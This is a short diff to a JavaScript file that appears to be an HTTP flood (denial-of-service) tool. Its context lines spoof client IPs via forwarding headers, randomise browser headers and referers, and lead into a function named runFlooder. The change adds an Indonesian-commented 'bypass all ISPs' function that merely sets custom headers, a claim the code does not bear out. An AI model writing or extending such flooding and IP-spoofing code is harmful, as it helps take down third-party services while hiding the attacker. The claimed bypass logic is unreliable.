@@ -3042,7 +3042,6 @@ headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
 headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
 headers["vary"] = randomHeaders['vary'];
 headers["x-requested-with"] = "XMLHttpRequest";
-headers["TE"] = trailers;
 headers["set-cookie"] = randomHeaders['set-cookie'];
 headers["Server"] = randomHeaders['Server'];
 headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
@@ -3060,6 +3059,19 @@ headers["X-Forwarded-Host"] = fakeIP;
 headers["Client-IP"] = fakeIP;
 headers["Real-IP"] = fakeIP;
 headers["Referer"] = randomReferer;
+
+// Logika bypass permintaan semua ISP
+const bypassISP = (target) => {
+    const isp = target.isp; // Ambil ISP dari target
+    if (isp) {
+        // Lakukan tindakan bypass
+        headers["X-Bypass-ISP"] = "true"; // Contoh header untuk bypass
+        headers["X-ISP-Name"] = isp; // Menyimpan nama ISP dalam header
+    }
+};
+
+// Panggil fungsi bypass dengan target yang ada
+bypassISP(parsedTarget);
 
  
  function runFlooder() {
